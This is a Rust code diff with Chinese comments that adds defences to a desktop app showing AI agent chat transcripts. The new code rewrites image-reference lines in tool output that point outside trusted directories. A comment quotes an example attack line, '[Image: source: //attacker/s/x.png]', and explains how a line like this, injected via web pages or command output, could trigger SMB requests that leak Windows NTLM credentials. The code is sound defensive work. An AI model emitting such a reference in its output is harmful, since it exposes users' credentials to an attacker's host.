@@ -1034,6 +1034,76 @@ pub fn resolve_within(roots: &[PathBuf], path: &Path) -> Option<PathBuf> {
         .then_some(real)
 }
 
+/// 工具回执里可信的图片引用行指向的根：Meowo 自己的图片目录、旧的粘贴目录，以及 Claude 各账号的
+/// image-cache（它的粘贴图引用行指向那里）。回执里其他位置的引用行一律当成伪造的（见
+/// [`neutralize_untrusted_refs`]）。这里只是一份目录清单，不按 agent 分支。
+pub fn trusted_ref_roots() -> Vec<PathBuf> {
+    let mut roots = readable_roots();
+    roots.extend(crate::plugins::claude::transcript::image_cache_dirs());
+    // 回放样本（tests/fixtures/chat-replay）把真机探针的数据目录统一换成了 C:\probe。
+    #[cfg(test)]
+    roots.push(PathBuf::from(if cfg!(windows) { r"C:\probe\images" } else { "/probe/images" }));
+    roots
+}
+
+/// 引用行里的路径是否落在 `roots` 之一里面。纯字符串判断，不碰文件系统（这一步要挡的正是
+/// 「对攻击者给的路径做 exists」）：必须是绝对路径、不是 UNC、不含 `..`，按分隔符边界比前缀
+/// （Windows 上不分大小写、`/` 与 `\` 等同）。
+pub fn is_trusted_ref(path: &str, roots: &[PathBuf]) -> bool {
+    use std::path::Component;
+    let path = path.trim();
+    let p = Path::new(path);
+    if is_remote_path(path)
+        || !p.is_absolute()
+        || p.components().any(|c| matches!(c, Component::ParentDir | Component::CurDir))
+    {
+        return false;
+    }
+    let norm = |s: &str| -> String {
+        let s = if cfg!(windows) { s.replace('/', "\\").to_lowercase() } else { s.to_string() };
+        s.trim_end_matches(std::path::MAIN_SEPARATOR).to_string()
+    };
+    let path = norm(path);
+    roots.iter().any(|root| {
+        let root = norm(&root.to_string_lossy());
+        !root.is_empty()
+            && path.len() > root.len()
+            && path.starts_with(&root)
+            && path[root.len()..].starts_with(std::path::MAIN_SEPARATOR)
+    })
+}
+
+/// 把回执正文里不指向可信根的图片引用行改写成普通文字：`[Image: source: X]` →
+/// `[Image source: X]`（`[Image #3: source: X]` → `[Image #3 source: X]`），前端的 IMAGE_REF
+/// 认不出它，就不会拿去 convertFileSrc；内容原样留着，用户仍看得到回执写了什么。
+///
+/// 为什么（做空第二轮）：回执正文来自网页、文件、命令输出，谁都能写一行
+/// `[Image: source: //attacker/s/x.png]`；前端会把它当缩略图自动加载，而 Tauri asset 协议在判
+/// 白名单之前就对路径做 is_symlink/exists，Windows 上即发起 SMB、可能带出 NTLM 凭据。
+pub fn neutralize_untrusted_refs(text: &mut String) {
+    if !text.contains("source: ") {
+        return;
+    }
+    static RE: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
+    // 与前端 Message.tsx / ChatImage.tsx 的 IMAGE_REF 同一个式子。
+    let re = RE.get_or_init(|| regex::Regex::new(r"\[Image( #\d+)?: source: ([^\]]+?)\]").unwrap());
+    if !re.is_match(text) {
+        return;
+    }
+    let roots = trusted_ref_roots();
+    let replaced = re.replace_all(text, |caps: &regex::Captures| {
+        let path = &caps[2];
+        if is_trusted_ref(path, &roots) {
+            caps[0].to_string()
+        } else {
+            format!("[Image{} source: {path}]", caps.get(1).map_or("", |m| m.as_str()))
+        }
+    });
+    if let std::borrow::Cow::Owned(new) = replaced {
+        *text = new;
+    }
+}
+
 /// 允许对话页读取的图片根：持久图片目录 + 旧数据的 `$TEMP/meowo-paste`（历史引用照常能读）。
 pub fn readable_roots() -> Vec<PathBuf> {
     let mut roots: Vec<PathBuf> = images_root().into_iter().collect();
